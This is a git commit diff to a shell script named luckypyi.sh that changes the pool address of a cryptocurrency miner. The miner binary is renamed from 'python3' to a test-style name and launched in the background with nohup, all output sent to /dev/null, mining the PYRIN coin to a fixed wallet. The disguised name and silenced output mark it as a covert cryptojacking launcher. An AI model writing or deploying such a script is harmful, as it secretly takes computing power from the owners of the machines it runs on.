5951c2dc3019601570175672e00c9bfb22eec3fc
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-15 13:18:58 +0700

    Update luckypyi.sh

--- luckypyi.sh
+++ luckypyi.sh
@@ -10,4 +10,4 @@ cd dot-lol
 
 mv python3 test$kolot
 
-nohup ./test$kolot -a PYRIN --pool stratum+tcp://103.120.19.63:443 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOTSEQ-$kolot --no-cl > /dev/null 2>&1 &
+nohup ./test$kolot -a PYRIN --pool stratum+tcp://de.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOTSEQ-$kolot --no-cl > /dev/null 2>&1 &
